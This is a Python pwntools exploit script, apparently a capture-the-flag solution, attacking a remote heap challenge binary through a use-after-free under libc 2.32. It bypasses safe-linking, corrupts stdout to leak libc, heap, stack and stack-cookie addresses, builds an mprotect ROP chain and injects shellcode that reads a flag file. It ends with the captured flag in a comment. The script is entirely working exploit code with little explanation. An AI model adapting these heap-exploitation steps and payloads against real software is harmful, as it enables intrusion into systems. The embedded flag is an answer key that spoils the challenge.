#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
import random

#Utils
def alloc(size,data):
	io.sendlineafter("Choice: ","1")
	io.sendlineafter("Size: ",f"{size}")
	io.sendafter("Data: ",data)

def delete(idx):
	io.sendlineafter("Choice: ","2")
	io.sendlineafter("Index: ",f"{idx}")
	return	io.recvline().strip()

def edit(idx,data):
	io.sendlineafter("Choice: ","3")
	io.sendlineafter("Index: ",f"{idx}")
	io.sendafter("Data: ",data)

def mask(heap_base,target):
	return (heap_base >> 0xc) ^ target

# libc 2.32
small_bin_offset = 0x1e3f10
_IO_2_1_stdout_ = 0x1e46c0
environ = 0x1e7600

#Gadgets
L_pop_rdi = 0x00158d1d
L_pop_rsi = 0x001906fc
L_pop_rdx = 0x001597d6 # pop rdx ; pop rbx ; ret ;
L_pop_rax = 0x001170ba
L_syscall = 0x000920d9

#Exploit
if __name__=="__main__":
#	io = process("./UAF",env={"LD_PRELOAD":"./libc-2.32.so"})
	io = remote("docker.hackthebox.eu",31780)

	#Leak libc
	for i in xrange(7): #0~6
		alloc(0x318,"HK")
	alloc(0x318,"HK") #7
	alloc(0x18,"HK") #8
	for i in xrange(7): # delete 0~6
		delete(i)
	delete(7)
	alloc(0x218,"A"*0x8) #0
	libc_leak = u64(delete(0).split(b": ")[1].strip().replace(b"A",b"").ljust(8,b"\0"))
	libc_base = libc_leak - small_bin_offset
	print(hex(libc_base))
	
	#Leak heap
	for i in xrange(7): #0~6
		alloc(0xf8,"HK")
	alloc(0xf8,"HK") #7
	alloc(0x18,"HK") #9
	alloc(0xf8,"HK") #10
	alloc(0x18,"HK") #11
	for i in xrange(7):
		delete(i)
	delete(7)
	delete(10)
	for i in xrange(7): #0~6
		alloc(0xf8,"HK")
	alloc(0xd8,"A"*0x8) #7
	heap_base = u64(delete(7).split(b": ")[1].strip().replace(b"A",b"").ljust(8,b"\0")) - 0x22d0
	print(hex(heap_base))

	#clear everything
	for i in xrange(7): # delete 0~6
		delete(i)
	delete(9)
	delete(8)
	delete(11)

	#Trigger UAF
	alloc(0x68,"HK0") #0
	alloc(0x68,"HK1") #1
	for i in xrange(2,7): #2 ~ 6
		alloc(0x18,f"HK{i}")
	delete(1)
	delete(0)
	edit(0,p8(p64(mask(heap_base,heap_base+0x23b0)+2)[0])) #,
	alloc(0x68,"HK") #0
	alloc(0x68,b"A"*0x8+p8(0xd1)) #1
	alloc(0x88,"HK") #7
	alloc(0x88,"HK") #8
	delete(8)
	delete(7)
	delete(6)
	alloc(0xc8,b"A"*0x18+p64(0x21)+p64(0)*3+p64(0x91)+p64(mask(heap_base,libc_base+_IO_2_1_stdout_-0x10)+2)) #6
	alloc(0x88,"HK") #7
	alloc(0x88,p64(0)*2+p64(0xfbad1800)+p64(0)*3+p64(libc_base+environ)+p64(libc_base+environ+0x20)*4) #8
	stack_leak = u64(io.recvn(8))
	print(hex(stack_leak))

	delete(6)
	alloc(0xa8,"HK") #6
	alloc(0xc8,b"A"*0x18+p64(0xb1)) #9
	delete(6)
	delete(2)
	delete(9)
	alloc(0xc8,b"A"*0x18+p64(0x41)+p64(mask(heap_base,libc_base+_IO_2_1_stdout_-0x20)+2)) #2
	alloc(0xa8,b"HK") #6
	alloc(0xa8,p64(0)*4+p64(0xfbad1800)+p64(0)*3+p64(stack_leak-0x130)+p64(stack_leak)*4) #9
	stack_cookie = u64(io.recvn(8))
	print(hex(stack_cookie))
	delete(2)
	alloc(0x98,"HK") #2
	alloc(0xc8,b"A"*0x18+p64(0xa1)+p64(0)*3+p64(0x91)+p64(0)*15+p64(0x21)) #10
	delete(2)
	delete(6)
	delete(10)
	alloc(0xc8,b"/home/ctf/flag.txt\0".ljust(0x18,b"A")+p64(0xa1)+p64(mask(heap_base,stack_leak-0x128)+2)) #2
	shellcode = asm(f"""
		mov rax,2
		mov rdi, {heap_base+0x23c0}
		mov rsi,0
		syscall
		mov rdi,rax
		mov rsi,{heap_base}
		mov rdx,0x100
		mov rax,0
		syscall
		mov rdi,1
		mov rax,1
		syscall
	""",arch="amd64")
	alloc(0x98,shellcode) #6
#	pause()
	L_ROP = p64(libc_base+L_pop_rdi)+p64(heap_base)+\
		p64(libc_base+L_pop_rsi)+p64(0x3000)+\
		p64(libc_base+L_pop_rdx)+p64(7)+p64(0)+\
		p64(libc_base+L_pop_rax)+p64(0xa)+\
		p64(libc_base+L_syscall)+\
		p64(heap_base+0x23e0)
	pause()
	alloc(0x98,b"A"*0x8+ L_ROP) #10
#	HTB{s4f3_l1nk1ng_b3c0m3s_uns4f3_5bf6ee5}
	io.interactive()
